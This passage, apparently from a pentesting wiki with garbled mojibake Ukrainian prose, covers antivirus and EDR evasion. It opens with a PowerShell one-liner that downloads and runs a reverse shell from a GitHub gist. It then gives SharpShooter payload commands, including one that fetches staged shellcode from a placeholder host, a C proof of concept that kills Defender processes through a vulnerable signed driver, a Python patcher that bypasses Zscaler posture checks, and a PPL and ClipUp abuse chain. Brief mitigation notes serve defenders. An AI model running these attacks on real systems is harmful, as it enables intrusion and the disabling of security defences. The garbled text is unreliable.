powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

–°–ø–∏—Å–æ–∫ –æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä—ñ–≤ C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### –ü—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è python –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —ñ–Ω–∂–µ–∫—Ç–æ—Ä—ñ–≤:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### –Ü–Ω—à—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### –î–µ—Ç–∞–ª—å–Ω—ñ—à–µ

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) ‚Äì –≤–∏–º–∫–Ω–µ–Ω–Ω—è AV/EDR –∑ –ø—Ä–æ—Å—Ç–æ—Ä—É —è–¥—Ä–∞

Storm-2603 –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–≤ –Ω–µ–≤–µ–ª–∏–∫—É –∫–æ–Ω—Å–æ–ª—å–Ω—É —É—Ç–∏–ª—ñ—Ç—É –≤—ñ–¥–æ–º—É —è–∫ **Antivirus Terminator** –¥–ª—è –≤–∏–º–∫–Ω–µ–Ω–Ω—è endpoint-–∑–∞—Ö–∏—Å—Ç—É –ø–µ—Ä–µ–¥ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è–º ransomware. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø—Ä–∏–Ω–æ—Å–∏—Ç—å —Å–≤—ñ–π **–≤—Ä–∞–∑–ª–∏–≤–∏–π, –∞–ª–µ *–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π* –¥—Ä–∞–π–≤–µ—Ä** —ñ –∑–ª–æ–≤–∂–∏–≤–∞—î –Ω–∏–º –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π —É –ø—Ä–æ—Å—Ç–æ—Ä—ñ —è–¥—Ä–∞, —è–∫—ñ –Ω–∞–≤—ñ—Ç—å —Å–ª—É–∂–±–∏ AV –∑ Protected-Process-Light (PPL) –Ω–µ –º–æ–∂—É—Ç—å –∑–∞–±–ª–æ–∫—É–≤–∞—Ç–∏.

–ö–ª—é—á–æ–≤—ñ –≤–∏—Å–Ω–æ–≤–∫–∏
1. **–ü—ñ–¥–ø–∏—Å–∞–Ω–∏–π –¥—Ä–∞–π–≤–µ—Ä**: –§–∞–π–ª, —â–æ –∑–∞–ø–∏—Å—É—î—Ç—å—Å—è –Ω–∞ –¥–∏—Å–∫ ‚Äî `ServiceMouse.sys`, –∞–ª–µ –±—ñ–Ω–∞—Ä–Ω–∏–∫ ‚Äî —Ü–µ –ª–µ–≥—ñ—Ç–∏–º–Ω–æ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π –¥—Ä–∞–π–≤–µ—Ä `AToolsKrnl64.sys` –∑ ‚ÄúSystem In-Depth Analysis Toolkit‚Äù –≤—ñ–¥ Antiy Labs. –û—Å–∫—ñ–ª—å–∫–∏ –¥—Ä–∞–π–≤–µ—Ä –º–∞—î –¥—ñ–π—Å–Ω–∏–π –ø—ñ–¥–ø–∏—Å Microsoft, –≤—ñ–Ω –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –Ω–∞–≤—ñ—Ç—å –∫–æ–ª–∏ —É–≤—ñ–º–∫–Ω–µ–Ω–æ Driver-Signature-Enforcement (DSE).
2. **–í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Å–µ—Ä–≤—ñ—Å—É**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
–ü–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ —Ä–µ—î—Å—Ç—Ä—É—î –¥—Ä–∞–π–≤–µ—Ä —è–∫ **kernel service**, –∞ –¥—Ä—É–≥–∏–π –∑–∞–ø—É—Å–∫–∞—î –π–æ–≥–æ, —Ä–æ–±–ª—è—á–∏ `\\.\ServiceMouse` –¥–æ—Å—Ç—É–ø–Ω–∏–º –∑ –ø—Ä–æ—Å—Ç–æ—Ä—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
3. **IOCTL–∏, —è–∫—ñ –¥—Ä–∞–π–≤–µ—Ä –µ–∫—Å–ø–æ–Ω—É—î**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | –ó–∞–≤–µ—Ä—à–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –ø—Ä–æ—Ü–µ—Å –∑–∞ PID (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–±–∏–≤—Å—Ç–≤–∞ —Å–ª—É–∂–± Defender/EDR) |
| `0x990000D0` | –í–∏–¥–∞–ª–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É |
| `0x990001D0` | –í–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –¥—Ä–∞–π–≤–µ—Ä —Ç–∞ –≤–∏–¥–∞–ª–∏—Ç–∏ —Å–µ—Ä–≤—ñ—Å |

–ú—ñ–Ω—ñ–º–∞–ª—å–Ω–∏–π proof-of-concept –Ω–∞ C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **–ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î**: BYOVD –ø–æ–≤–Ω—ñ—Å—Ç—é –æ–±—Ö–æ–¥–∏—Ç—å –∑–∞—Ö–∏—Å—Ç —É user-mode; –∫–æ–¥, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤ —è–¥—Ä—ñ, –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ *protected* –ø—Ä–æ—Ü–µ—Å–∏, –∑–∞–≤–µ—Ä—à—É–≤–∞—Ç–∏ —ó—Ö –∞–±–æ –º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –æ–±‚Äô—î–∫—Ç–∏ —è–¥—Ä–∞ –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ PPL/PP, ELAM —á–∏ —ñ–Ω—à–∏—Ö –º–µ—Ö–∞–Ω—ñ–∑–º—ñ–≤ –∂–æ—Ä—Å—Ç–∫–æ—ó –∑–∞—Ö–∏—Å—Ç—É.

–í–∏—è–≤–ª–µ–Ω–Ω—è / –ú—ñ—Ç—ñ–≥–∞—Ü—ñ—è
‚Ä¢  –£–≤—ñ–º–∫–Ω—ñ—Ç—å —Å–ø–∏—Å–æ–∫ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –¥—Ä–∞–π–≤–µ—Ä—ñ–≤ Microsoft (`HVCI`, `Smart App Control`), —â–æ–± Windows –≤—ñ–¥–º–æ–≤–ª—è–≤—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ `AToolsKrnl64.sys`.
‚Ä¢  –°–ª—ñ–¥–∫—É–π—Ç–µ –∑–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è–º –Ω–æ–≤–∏—Ö *kernel* —Å–µ—Ä–≤—ñ—Å—ñ–≤ —ñ –ø–æ–≤—ñ–¥–æ–º–ª—è–π—Ç–µ, –∫–æ–ª–∏ –¥—Ä–∞–π–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó, –¥–æ—Å—Ç—É–ø–Ω–æ—ó –¥–ª—è –∑–∞–ø–∏—Å—É –≤—Å—ñ–º, –∞–±–æ —è–∫—â–æ –π–æ–≥–æ –Ω–µ–º–∞—î –≤ allow-list.
‚Ä¢  –ú–æ–Ω—ñ—Ç–æ—Ä—å—Ç–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ –≤ user-mode –¥–æ –∫–∞—Å—Ç–æ–º–Ω–∏—Ö device-–æ–±‚Äô—î–∫—Ç—ñ–≤ —ñ–∑ –ø–æ–¥–∞–ª—å—à–∏–º–∏ –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏–º–∏ –≤–∏–∫–ª–∏–∫–∞–º–∏ `DeviceIoControl`.

### –û–±—Ö—ñ–¥ Posture-–ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ Zscaler Client Connector —à–ª—è—Ö–æ–º –ø–∞—Ç—á—É–≤–∞–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤ –Ω–∞ –¥–∏—Å–∫—É

Zscaler‚Äôs **Client Connector** –∑–∞—Å—Ç–æ—Å–æ–≤—É—î –ø—Ä–∞–≤–∏–ª–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å—Ç–∞–Ω—É –ø—Ä–∏—Å—Ç—Ä–æ—é –ª–æ–∫–∞–ª—å–Ω–æ —ñ –ø–æ–∫–ª–∞–¥–∞—î—Ç—å—Å—è –Ω–∞ Windows RPC –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤ —ñ–Ω—à–∏–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º. –î–≤–∞ —Å–ª–∞–±–∫—ñ –¥–∏–∑–∞–π–Ω–µ—Ä—Å—å–∫—ñ —Ä—ñ—à–µ–Ω–Ω—è —Ä–æ–±–ª—è—Ç—å –º–æ–∂–ª–∏–≤–∏–º –ø–æ–≤–Ω–∏–π –æ–±—Ö—ñ–¥:

1. –û—Ü—ñ–Ω–∫–∞ posture –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è **–ø–æ–≤–Ω—ñ—Å—Ç—é –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞** (—Å–µ—Ä–≤–µ—Ä –æ—Ç—Ä–∏–º—É—î –ª–∏—à–µ –±—É–ª–µ–≤–µ –∑–Ω–∞—á–µ–Ω–Ω—è).
2. –í–Ω—É—Ç—Ä—ñ—à–Ω—ñ RPC-–µ–Ω–¥–ø–æ—ó–Ω—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å –ª–∏—à–µ, —â–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª **–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π Zscaler** (—á–µ—Ä–µ–∑ `WinVerifyTrust`).

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–ø–∞—Ç—á—É–≤–∞–Ω–Ω—è —á–æ—Ç–∏—Ä—å–æ—Ö –ø—ñ–¥–ø–∏—Å–∞–Ω–∏—Ö –±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤ –Ω–∞ –¥–∏—Å–∫—É** –æ–±–∏–¥–≤–∞ –º–µ—Ö–∞–Ω—ñ–∑–º–∏ –º–æ–∂–Ω–∞ –Ω–µ–π—Ç—Ä–∞–ª—ñ–∑—É–≤–∞—Ç–∏:

| –ë—ñ–Ω–∞—Ä–Ω–∏–∫ | –ü–æ—á–∞—Ç–∫–æ–≤–∞ –ª–æ–≥—ñ–∫–∞, —â–æ –∑–º—ñ–Ω–µ–Ω–∞ | –†–µ–∑—É–ª—å—Ç–∞—Ç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() ‚Üí return 0/1` | –ó–∞–≤–∂–¥–∏ –ø–æ–≤–µ—Ä—Ç–∞—î `1`, —Ç–æ–∂ –∫–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –≤–≤–∞–∂–∞—î—Ç—å—Å—è –∑–∞–¥–æ–≤—ñ–ª—å–Ω–æ—é |
| `ZSAService.exe` | –û–ø–æ—Å–µ—Ä–µ–¥–∫–æ–≤–∞–Ω–∏–π –≤–∏–∫–ª–∏–∫ –¥–æ `WinVerifyTrust` | –ó–∞–º—ñ–Ω–µ–Ω–æ –Ω–∞ NOP ‚áí –±—É–¥—å-—è–∫–∏–π (–Ω–∞–≤—ñ—Ç—å –Ω–µ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π) –ø—Ä–æ—Ü–µ—Å –º–æ–∂–µ –ø—Ä–∏–≤‚Äô—è–∑–∞—Ç–∏—Å—è –¥–æ RPC pipe-—ñ–≤ |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | –ó–∞–º—ñ–Ω–µ–Ω–æ –Ω–∞ `mov eax,1 ; ret` |
| `ZSATunnel.exe` | –ü–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ç—É–Ω–µ–ª—é | –ü—Ä–æ–ø—É—â–µ–Ω–æ |

–§—Ä–∞–≥–º–µ–Ω—Ç –º—ñ–Ω—ñ–º–∞–ª—å–Ω–æ–≥–æ –ø–∞—Ç—á–µ—Ä–∞:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
–ü—ñ—Å–ª—è –∑–∞–º—ñ–Ω–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ —ñ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫—É —Å—Ç–µ–∫—É —Å–µ—Ä–≤—ñ—Å—ñ–≤:

* **–£—Å—ñ** –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å—Ç–∞–Ω—É –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è —è–∫ **green/compliant**.
* –ù–µ–ø—ñ–¥–ø–∏—Å–∞–Ω—ñ –∞–±–æ –∑–º—ñ–Ω–µ–Ω—ñ –±—ñ–Ω–∞—Ä–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ named-pipe RPC endpoints (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `\\RPC Control\\ZSATrayManager_talk_to_me`).
* –ö–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —Ö–æ—Å—Ç –æ—Ç—Ä–∏–º—É—î –Ω–µ–æ–±–º–µ–∂–µ–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó –º–µ—Ä–µ–∂—ñ, –≤–∏–∑–Ω–∞—á–µ–Ω–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∞–º–∏ Zscaler.

–¶–µ–π –∫–µ–π—Å –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î, —è–∫ —Ä—ñ—à–µ–Ω–Ω—è, —â–æ –±–∞–∑—É—é—Ç—å—Å—è –≤–∏–∫–ª—é—á–Ω–æ –Ω–∞ –∫–ª—ñ—î–Ω—Ç—Å—å–∫—ñ–π –¥–æ–≤—ñ—Ä—ñ, —Ç–∞ –ø—Ä–æ—Å—Ç—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—É –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –∫—ñ–ª—å–∫–æ–º–∞ –±–∞–π—Ç-–ø–∞—Ç—á–∞–º–∏.

## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Protected Process Light (PPL) –¥–ª—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó AV/EDR –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é LOLBINs

Protected Process Light (PPL) –∑–∞–ø—Ä–æ–≤–∞–¥–∂—É—î —ñ—î—Ä–∞—Ä—Ö—ñ—é signer/level —Ç–∞–∫, —â–æ –ª–∏—à–µ –ø—Ä–æ—Ü–µ—Å–∏ –∑ —Ä—ñ–≤–Ω–µ–º –Ω–µ –Ω–∏–∂—á–µ –º–æ–∂—É—Ç—å –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –æ–¥–∏–Ω –æ–¥–Ω–∏–º. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫—É: —è–∫—â–æ –º–æ–∂–Ω–∞ –ª–µ–≥—ñ—Ç–∏–º–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–∫ —ñ–∑ –ø—ñ–¥—Ç—Ä–∏–º–∫–æ—é PPL —ñ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –π–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∏, —Ç–æ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–µ—à–∫—ñ–¥–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ—é (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ª–æ–≥—É–≤–∞–Ω–Ω—è) —É –æ–±–º–µ–∂–µ–Ω—É, –ø—ñ–¥–∫—Ä—ñ–ø–ª–µ–Ω—É PPL –ø—Ä–∏–º—ñ—Ç–∏–≤–Ω—É –æ–ø–µ—Ä–∞—Ü—ñ—é –∑–∞–ø–∏—Å—É —É –∑–∞—Ö–∏—â–µ–Ω—ñ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è AV/EDR.

–©–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± –ø—Ä–æ—Ü–µ—Å –ø—Ä–∞—Ü—é–≤–∞–≤ —è–∫ PPL
- –¶—ñ–ª—å–æ–≤–∏–π EXE (—Ç–∞ –±—É–¥—å-—è–∫—ñ –ø—ñ–¥–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ DLL) –º–∞—î –±—É—Ç–∏ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π –∑ PPL-capable EKU.
- –ü—Ä–æ—Ü–µ—Å –º–∞—î –±—É—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π —á–µ—Ä–µ–∑ CreateProcess –∑ –ø—Ä–∞–ø–æ—Ä–∞–º–∏: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- –ú–∞—î –±—É—Ç–∏ –∑–∞–ø—Ä–æ—à–µ–Ω–æ —Å—É–º—ñ—Å–Ω–∏–π —Ä—ñ–≤–µ–Ω—å –∑–∞—Ö–∏—Å—Ç—É, —è–∫–∏–π –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –ø—ñ–¥–ø–∏—Å—É–≤–∞—á—É –±—ñ–Ω–∞—Ä–Ω–∏–∫–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` –¥–ª—è anti-malware –ø—ñ–¥–ø–∏—Å—É–≤–∞—á—ñ–≤, `PROTECTION_LEVEL_WINDOWS` –¥–ª—è Windows –ø—ñ–¥–ø–∏—Å—É–≤–∞—á—ñ–≤). –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ —Ä—ñ–≤–Ω—ñ –ø—Ä–∏–∑–≤–µ–¥—É—Ç—å –¥–æ –ø–æ–º–∏–ª–∫–∏ –ø—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- –í—ñ–¥–∫—Ä–∏—Ç–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç-–ø–æ–º—ñ—á–Ω–∏–∫: CreateProcessAsPPL (–≤–∏–±–∏—Ä–∞—î —Ä—ñ–≤–µ–Ω—å –∑–∞—Ö–∏—Å—Ç—É —Ç–∞ –ø–µ—Ä–µ—Å–∏–ª–∞—î –∞—Ä–≥—É–º–µ–Ω—Ç–∏ –¥–æ —Ü—ñ–ª—å–æ–≤–æ–≥–æ EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- –ü—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Å–∏—Å—Ç–µ–º–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–∫ `C:\Windows\System32\ClipUp.exe` —Å–∞–º–æ–∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –π –ø—Ä–∏–π–º–∞—î –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è –∑–∞–ø–∏—Å—É —Ñ–∞–π–ª—É –∂—É—Ä–Ω–∞–ª—É –≤ —à–ª—è—Ö, –≤–∫–∞–∑–∞–Ω–∏–π –≤–∏–∫–ª–∏–∫–æ–º.
- –ö–æ–ª–∏ –∑–∞–ø—É—â–µ–Ω–æ —è–∫ –ø—Ä–æ—Ü–µ—Å PPL, –∑–∞–ø–∏—Å —Ñ–∞–π–ª—É –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –∑ –ø—ñ–¥—Ç—Ä–∏–º–∫–æ—é PPL.
- ClipUp –Ω–µ –º–æ–∂–µ —Ä–æ–∑–±–∏—Ä–∞—Ç–∏ —à–ª—è—Ö–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å –ø—Ä–æ–±—ñ–ª–∏; –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ 8.3 short paths, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –∑–∞–∑–≤–∏—á–∞–π –∑–∞—Ö–∏—â–µ–Ω—ñ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è.

8.3 short path helpers
- –ü–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –∫–æ—Ä–æ—Ç–∫—ñ —ñ–º–µ–Ω–∞: `dir /x` —É –∫–æ–∂–Ω–æ–º—É –±–∞—Ç—å–∫—ñ–≤—Å—å–∫–æ–º—É –∫–∞—Ç–∞–ª–æ–∑—ñ.
- –û—Ç—Ä–∏–º–∞—Ç–∏ –∫–æ—Ä–æ—Ç–∫–∏–π —à–ª—è—Ö —É cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) –ó–∞–ø—É—Å—Ç—ñ—Ç—å PPL-capable LOLBIN (ClipUp) –∑ `CREATE_PROTECTED_PROCESS`, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ª–∞—É–Ω—á–µ—Ä (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, CreateProcessAsPPL).
2) –ü–µ—Ä–µ–¥–∞–π—Ç–µ –∞—Ä–≥—É–º–µ–Ω—Ç —à–ª—è—Ö—É –∂—É—Ä–Ω–∞–ª—É ClipUp, —â–æ–± –ø—Ä–∏–º—É—Å–∏—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–∞–π–ª—É –≤ –∑–∞—Ö–∏—â–µ–Ω–æ–º—É –∫–∞—Ç–∞–ª–æ–∑—ñ AV (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, Defender Platform). –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ 8.3 short names –∑–∞ –ø–æ—Ç—Ä–µ–±–∏.
3) –Ø–∫—â–æ —Ü—ñ–ª—å–æ–≤–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–∫ –∑–∞–∑–≤–∏—á–∞–π –≤—ñ–¥–∫—Ä–∏—Ç–∏–π/–∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–∏–π AV –ø—ñ–¥ —á–∞—Å —Ä–æ–±–æ—Ç–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, MsMpEng.exe), –∑–∞–ø–ª–∞–Ω—É–π—Ç–µ –∑–∞–ø–∏—Å –ø—ñ–¥ —á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ —Ç–æ–≥–æ, —è–∫ AV –∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–æ–≤—É —Å–ª—É–∂–±—É, —è–∫–∞ –Ω–∞–¥—ñ–π–Ω–æ –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è —Ä–∞–Ω—ñ—à–µ. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø–æ—Ä—è–¥–æ–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Process Monitor (boot logging).
